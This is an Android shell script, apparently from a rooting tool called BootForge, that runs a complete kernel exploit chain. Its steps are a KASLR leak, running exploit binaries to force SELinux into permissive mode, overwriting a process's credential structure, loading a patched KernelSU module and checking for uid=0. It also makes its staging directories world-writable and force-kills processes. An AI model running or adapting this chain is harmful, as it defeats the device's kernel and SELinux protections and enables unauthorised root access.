#!/system/bin/sh
# MagicRoot 一键链路（BootForge 接入版）。
# 工作目录 /data/local/tmp/magic；成功后由应用自动清理工作目录。
# 与 MagicRoot 的差异：第 7 步不安装 ksud / 不加冕 KernelSU 管理器，
# 只保留 /data/local/tmp/bootforge/bfexec 作为本应用的 Root 执行通道。
set -u
D=/data/local/tmp/magic
R=/data/local/tmp/bootforge
mkdir -p "$D" "$D/honor" "$R"
# helper 能力清零后写文件依赖目录 other-w 权限，必须 777（umask 044 时 mkdir 是 755 会 EACCES）
chmod 777 "$D" "$D/honor" 2>/dev/null
cd "$D" || exit 1
chmod 755 "$D"/kaslr_slide "$D"/ko_patch "$D"/addrcalc "$D"/t64560_v36 "$D"/cred_target "$D"/t64560_cred "$D"/bfexec "$D"/forker 2>/dev/null

# 清理旧版 Download/临时执行目录残留
rm -rf /data/local/tmp/.magicroot-exec /storage/emulated/0/Download/MagicRoot 2>/dev/null
rm -rf /data/local/tmp/honor /data/local/tmp/root_stage.sh 2>/dev/null
rm -f /data/local/tmp/bl_*.bin /data/local/tmp/bl_text.txt 2>/dev/null

# 清理上一次中止留下的 helper / victim
pkill -9 -f '[c]red_target' 2>/dev/null
pkill -9 -f '[t]64560_v36' 2>/dev/null
pkill -9 -f '[t]64560_cred' 2>/dev/null
pkill -9 -f '[v]ictim-child' 2>/dev/null
pkill -9 exe 2>/dev/null
sleep 1

rm -f "$D"/bl_*.bin "$D"/bl_text.txt 2>/dev/null
rm -f "$D"/honor/PHASE2_DONE "$D"/honor/CAPBND_OK
rm -f "$D"/cred.log "$D"/finti.try "$D"/finti.rc "$D"/finti.skip "$D"/root_id "$D"/ksu-patched.ko "$D"/kaslr.txt

echo "== 1. KASLR =="
# 1.0.1 起：grab.sh 用 forker 放大 trace 事件量，退出前恢复 tracing 避免干扰竞态；
# 抓不到锚点时回退 grab_legacy.sh。
sh "$D/grab.sh" >/dev/null 2>&1
"$D/kaslr_slide" "$D" > "$D/kaslr.txt"
if ! grep -q '^KASLR_SLIDE=' "$D/kaslr.txt" || ! grep -q '^SELINUX_ARG=' "$D/kaslr.txt" ||
   ! grep -q '^PREPARE=' "$D/kaslr.txt"; then
    echo "KASLR_GRAB_FALLBACK"
    sh "$D/grab_legacy.sh" >/dev/null 2>&1
    "$D/kaslr_slide" "$D" > "$D/kaslr.txt"
fi
cat "$D/kaslr.txt"
SLIDE=$(sed -n 's/^KASLR_SLIDE=//p' "$D/kaslr.txt")
SELINUX_ARG=$(sed -n 's/^SELINUX_ARG=//p' "$D/kaslr.txt")
PREPARE=$(sed -n 's/^PREPARE=//p' "$D/kaslr.txt")
[ -n "$SLIDE" ] || { echo "FAIL=kaslr"; exit 2; }
case "$PREPARE" in 0xffff*|0xffffff*) ;; *) echo "FAIL=bad_prepare"; exit 2 ;; esac
case "$SELINUX_ARG" in 0xffff*|0xffffff*) ;; *) echo "FAIL=bad_selinux_arg"; exit 2 ;; esac

echo "== 2. patch KernelSU module =="
"$D/ko_patch" "$D/ksu-template.ko" "$D/ksu-patched.ko" "$D/syms.txt" "$SLIDE" "$(uname -r)" || { echo "FAIL=ko_patch"; exit 3; }

echo "== 3. SELinux permissive =="
if [ "$(getenforce)" != "Permissive" ]; then
    "$D/t64560_v36" 0 "$SELINUX_ARG" 300 400 32 12000 12000 4500
fi
[ "$(getenforce)" = "Permissive" ] || { echo "FAIL=permissive"; exit 4; }

echo "== 4. cred target =="
TP=$(cat /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id 2>/dev/null)
[ -n "$TP" ] || TP=324
"$D/cred_target" "$PREPARE" "$TP" "$D/honor/PHASE2_DONE" "$D/ksu-patched.ko" > "$D/cred.log" 2>&1 &
CT_PID=$!
i=0; CRED=""
while [ $i -lt 40 ]; do
    CRED=$(sed -n 's/.*CRED=0x\([0-9a-f]*\).*/0x\1/p' "$D/cred.log" | tail -1)
    [ -n "$CRED" ] && break
    sleep 1; i=$((i+1))
done
cat "$D/cred.log"
[ -n "$CRED" ] || { echo "FAIL=cred_target"; exit 5; }

echo "== 5. fsuid/fsgid =="
FSUID=$("$D/addrcalc" add "$CRED" 0x20)
"$D/t64560_v36" 0 "$FSUID" 300 400 32 12000 12000 4500
echo "fsuid step done (CapBnd 由 helper 在 phase1 后写入 CAPBND_OK)"

echo "== 6. phase1+phase2 =="
# 兜底门闩：cred_target 的 CapBnd 翻 0 时由本脚本代写 CAPBND_OK。
# helper 在能力被清空后自建该文件不可靠（实测会 open EACCES），这里不依赖任何能力。
# 一直等到 PHASE2_DONE 或链路失败为止，不设固定次数上限（phase1 落地可能要十几分钟）。
( while true; do
    [ -f "$D/honor/PHASE2_DONE" ] && break
    grep -q '^FAIL=' "$D/run.log" 2>/dev/null && break
    CB=$(sed -n 's/^CapBnd:[[:space:]]*//p' /proc/$CT_PID/status 2>/dev/null)
    if [ "$CB" = "0000000000000000" ]; then touch "$D/honor/CAPBND_OK"; break; fi
    sleep 0.2 2>/dev/null || sleep 1
  done ) &
"$D/t64560_cred" "$CRED" 260 320 400 16 6000 12000 4500
# phase2 未完成时绝不能往下走：内核模块可能仍是旧实例，后续授权必定失败。
[ -f "$D/honor/PHASE2_DONE" ] || { echo "FAIL=phase2"; exit 6; }
i=0
while [ $i -lt 90 ]; do grep -q '^kernelsu ' /proc/modules && break; sleep 2; i=$((i+1)); done
grep -q '^kernelsu ' /proc/modules || { echo "FAIL=module"; exit 7; }
echo "MODULE_LOADED"
# 等 cred_target 的 GRANT 自检/修复结果（v2 起总会打印一行）
i=0; G=""
while [ $i -lt 20 ]; do
    G=$(grep -o 'GRANT_[A-Z_]*' "$D/cred.log" 2>/dev/null | tail -1)
    [ -n "$G" ] && break
    sleep 1; i=$((i+1))
done
echo "grant status: ${G:-none}"
[ "$G" = "GRANT_DENIED" ] && { echo "FAIL=grant_denied"; exit 7; }

echo "== 6.5 module/grant detail =="
cat "$D"/cred.log 2>/dev/null
cat "$D"/magic/finti.rc 2>/dev/null

echo "== 7. BootForge root exec =="
cp "$D/bfexec" "$R/bfexec" && chmod 700 "$R" "$R/bfexec"
"$R/bfexec" > "$D/root_id" 2>&1
cat "$D/root_id" 2>/dev/null
grep -q 'uid=0' "$D/root_id" || { echo "FAIL=grant"; exit 8; }
echo "DONE"
